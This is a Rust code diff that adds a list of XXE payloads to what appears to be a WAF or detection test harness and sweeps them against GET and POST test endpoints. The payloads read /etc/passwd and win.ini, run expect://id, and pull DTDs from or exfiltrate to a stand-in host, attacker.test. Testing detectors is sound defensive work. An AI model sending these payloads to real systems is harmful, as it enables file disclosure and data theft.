@@ -232,6 +232,24 @@ const NOSQL_INJECTION_PAYLOADS: &[&str] = &[
     r#"{"$or":[{}], "token":"%00"}"#,
 ];
 
+const XXE_ATTACK_PAYLOADS: &[&str] = &[
+    r#"<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><x>&xxe;</x>"#,
+    r#"<?xml version="1.0"?><!DOCTYPE xxe [<!ENTITY send SYSTEM "http://attacker.test/exfil">]><x>&send;</x>"#,
+    r#"<!DOCTYPE soap [<!ENTITY xxe SYSTEM "file:///etc/password">]><soap>&xxe;</soap>"#,
+    r#"<xi:include href="file:///etc/passwd" xmlns:xi="http://www.w3.org/2001/XInclude"/>"#,
+    r#"<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/password"/></root>"#,
+    r#"<!DOCTYPE data [<!ENTITY eval SYSTEM "php://filter/read=convert.base64-encode/resource=file">]>"#,
+    r#"<!DOCTYPE xxe [<!ENTITY % exfil SYSTEM "http://attacker.test/evil.dtd">%exfil;]>"#,
+    r#"<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>"#,
+    r#"<!DOCTYPE xxe [<!ENTITY file SYSTEM "file:///c:/windows/win.ini">]><x>&file;</x>"#,
+    r#"<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "gopher://127.0.0.1/send">]><x>&xxe;</x>"#,
+    r#"<soap:Envelope><!DOCTYPE xxe [<!ENTITY xxe SYSTEM "file:///etc/passwd">]></soap:Envelope>"#,
+    r#"<!DOCTYPE xxe [<!ENTITY xxe "send exfil">]><x>&xxe;</x>"#,
+    r#"<!ENTITY xxe SYSTEM "file:///etc/password">"#,
+    r#"<root><xi:include href="http://attacker.test/xxe" xmlns:xi="urn:xi"/></root>"#,
+    "%3C%00!%00D%00O%00C%00T%00Y%00P%00E%00%20%00x%00x%00e%00%20%00%5B%00%3C%00!%00E%00N%00T%00I%00T%00Y%00%20%00x%00x%00e%00%20%00S%00Y%00S%00T%00E%00M%00%20%00%22%00f%00i%00l%00e%00:%00/%00/%00/%00e%00t%00c%00/%00p%00a%00s%00s%00w%00d%00%22%00%3E%00%5D%00%3E%00",
+];
+
 const SCANNER_UAS: &[(&str, &str)] = &[
     ("nikto/2.1.6", "Nikto"),
     ("sqlmap/1.7", "sqlmap"),
@@ -735,6 +753,32 @@ async fn main() {
             &cfg.target,
             "/test_post",
             NOSQL_INJECTION_PAYLOADS,
+            cfg.concurrency
+        )
+    );
+    run_sweep!(
+        format!(
+            "XXE attack DFA — GET /test_get ({} payloads)",
+            XXE_ATTACK_PAYLOADS.len()
+        ),
+        sweep_get(
+            &client,
+            &cfg.target,
+            "/test_get",
+            XXE_ATTACK_PAYLOADS,
+            cfg.concurrency
+        )
+    );
+    run_sweep!(
+        format!(
+            "XXE attack DFA — POST /test_post ({} payloads)",
+            XXE_ATTACK_PAYLOADS.len()
+        ),
+        sweep_post(
+            &client,
+            &cfg.target,
+            "/test_post",
+            XXE_ATTACK_PAYLOADS,
             cfg.concurrency
         )
     );
